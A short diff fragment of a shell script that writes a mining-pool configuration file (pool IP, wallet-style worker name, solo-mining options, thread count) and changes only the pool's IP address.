@@ -15,7 +15,7 @@ while true; do
   
   cat > config.json <<END
 {
-  "url": "45.115.224.212:443",
+  "url": "45.115.224.92:443",
   "user": "WbpHqVBkysEDZLvX3TQJ4HZwZ2yWzoJwbZ.worker1",
   "pass": "c=SWAMP,m=solo,zap=SWAMP,mc=SWAMP",
   "threads": 6,
